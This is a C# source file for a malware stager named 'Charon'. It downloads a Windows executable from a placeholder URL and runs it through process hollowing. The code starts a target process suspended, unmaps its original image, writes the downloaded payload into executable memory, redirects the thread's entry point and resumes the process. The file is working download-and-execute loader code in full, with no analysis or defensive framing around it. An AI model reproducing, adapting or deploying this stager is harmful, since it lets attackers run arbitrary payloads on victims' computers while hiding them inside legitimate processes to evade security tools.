using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Charon
{
    public class Stager
    {
        public static void Execute()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            byte[] peBytes;
            using (WebClient wc = new WebClient())
            {
                peBytes = wc.DownloadData("%DOWNLOAD_URL%");
            }

            RunPE.Execute(peBytes, @"%SPAWN_PROCESS%");
        }
    }

    internal static class RunPE
    {
        const uint CREATE_SUSPENDED = 0x4;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // x64 CONTEXT layout
        const int CONTEXT64_SIZE = 1232;
        const int CTX_FLAGS_OFFSET = 0x30;
        const int CTX_RCX_OFFSET = 0x80;
        const int CTX_RDX_OFFSET = 0x88;
        const uint CONTEXT_FULL = 0x10000B;

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved, lpDesktop, lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public ushort wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public uint dwProcessId, dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll")]
        static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        public static void Execute(byte[] payload, string targetProcess)
        {
            // --- Parse PE headers ---
            if (payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D)
                return;

            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            if (e_lfanew < 0 || e_lfanew + 4 > payload.Length)
                return;
            if (BitConverter.ToUInt32(payload, e_lfanew) != 0x00004550)
                return;

            int optHeaderOffset = e_lfanew + 24;
            ushort magic = BitConverter.ToUInt16(payload, optHeaderOffset);
            if (magic != 0x20B) // PE32+ (x64) only
                return;

            uint entryPointRva = BitConverter.ToUInt32(payload, optHeaderOffset + 16);
            long imageBase = BitConverter.ToInt64(payload, optHeaderOffset + 24);
            uint sizeOfImage = BitConverter.ToUInt32(payload, optHeaderOffset + 56);
            uint sizeOfHeaders = BitConverter.ToUInt32(payload, optHeaderOffset + 60);
            ushort numberOfSections = BitConverter.ToUInt16(payload, e_lfanew + 6);
            ushort sizeOfOptionalHeader = BitConverter.ToUInt16(payload, e_lfanew + 20);

            // --- Create suspended process ---
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi;

            if (!CreateProcessW(targetProcess, null,
                IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
                IntPtr.Zero, null, ref si, out pi))
                return;

            // --- Get thread context (Rdx = PEB pointer) ---
            // Allocate 16-byte aligned CONTEXT
            IntPtr rawCtx = Marshal.AllocHGlobal(CONTEXT64_SIZE + 16);
            IntPtr ctx = (IntPtr)(((long)rawCtx + 15) & ~15L);

            try
            {
                // Zero out
                for (int i = 0; i < CONTEXT64_SIZE; i++)
                    Marshal.WriteByte(ctx, i, 0);

                Marshal.WriteInt32(ctx, CTX_FLAGS_OFFSET, (int)CONTEXT_FULL);

                if (!GetThreadContext(pi.hThread, ctx))
                {
                    TerminateProcess(pi.hProcess, 1);
                    return;
                }

                // PEB address from Rdx
                long pebAddress = Marshal.ReadInt64(ctx, CTX_RDX_OFFSET);

                // Read original ImageBaseAddress from PEB + 0x10
                byte[] buf8 = new byte[8];
                uint br;
                ReadProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), buf8, 8, out br);
                long originalImageBase = BitConverter.ToInt64(buf8, 0);

                // --- Hollow the process ---
                NtUnmapViewOfSection(pi.hProcess, (IntPtr)originalImageBase);

                // Allocate at preferred image base
                IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase,
                    sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (newBase == IntPtr.Zero)
                {
                    TerminateProcess(pi.hProcess, 1);
                    return;
                }

                // --- Write PE headers ---
                uint bw;
                byte[] headerBytes = new byte[sizeOfHeaders];
                Buffer.BlockCopy(payload, 0, headerBytes, 0, (int)sizeOfHeaders);
                WriteProcessMemory(pi.hProcess, newBase, headerBytes, sizeOfHeaders, out bw);

                // --- Write sections ---
                int sectionTableOffset = e_lfanew + 24 + sizeOfOptionalHeader;
                for (int i = 0; i < numberOfSections; i++)
                {
                    int shdr = sectionTableOffset + (i * 40);
                    uint virtualAddress = BitConverter.ToUInt32(payload, shdr + 12);
                    uint sizeOfRawData = BitConverter.ToUInt32(payload, shdr + 16);
                    uint pointerToRawData = BitConverter.ToUInt32(payload, shdr + 20);

                    if (sizeOfRawData == 0 || pointerToRawData == 0)
                        continue;

                    byte[] section = new byte[sizeOfRawData];
                    Buffer.BlockCopy(payload, (int)pointerToRawData, section, 0, (int)sizeOfRawData);
                    WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + virtualAddress),
                        section, sizeOfRawData, out bw);
                }

                // --- Update PEB ImageBaseAddress if base changed ---
                if ((long)newBase != originalImageBase)
                {
                    byte[] baseBytes = BitConverter.GetBytes((long)newBase);
                    WriteProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), baseBytes, 8, out bw);
                }

                // --- Set entry point and resume ---
                long entryPoint = (long)newBase + entryPointRva;
                Marshal.WriteInt64(ctx, CTX_RCX_OFFSET, entryPoint);

                if (!SetThreadContext(pi.hThread, ctx))
                {
                    TerminateProcess(pi.hProcess, 1);
                    return;
                }

                ResumeThread(pi.hThread);
            }
            catch
            {
                TerminateProcess(pi.hProcess, 1);
            }
            finally
            {
                Marshal.FreeHGlobal(rawCtx);
            }
        }
    }
}
